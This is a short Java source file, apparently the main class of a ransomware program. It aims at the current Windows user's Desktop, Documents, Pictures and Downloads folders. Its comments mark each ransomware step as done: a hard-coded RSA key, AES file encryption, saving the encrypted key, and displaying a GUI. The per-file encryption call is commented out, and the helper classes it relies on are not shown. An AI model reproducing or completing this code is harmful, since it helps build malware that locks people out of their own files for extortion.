package main;

public class Main {

	public static final String user = System.getProperty("user.name");

	public static String[] target_paths = new String[] { "C:\\Users\\" + user + "\\Desktop",
			"C:\\Users\\" + user + "\\Documents", "C:\\Users\\" + user + "\\Pictures",
			"C:\\Users\\" + user + "\\Downloads", };

	public static void main(String[] args) {
		// Public RSA key hard coded - Done
		// Generate AES key - Done
		// loop through files in specific directories - Done
		// Encrypt files with AES key - Done
		// Encrypt AES key with RSA key - Done
		// Save AES key - Done
		// Display GUI - Done

		UI ui = new UI();
		FileItter file = new FileItter(target_paths);
		Crypto crypto = new Crypto(true);
		for (String f : file.getPaths()) {
			// crypto.ProcessFile(f);
		}
		crypto.encrypt_AES_key();
		ui.Entry();

	}

}
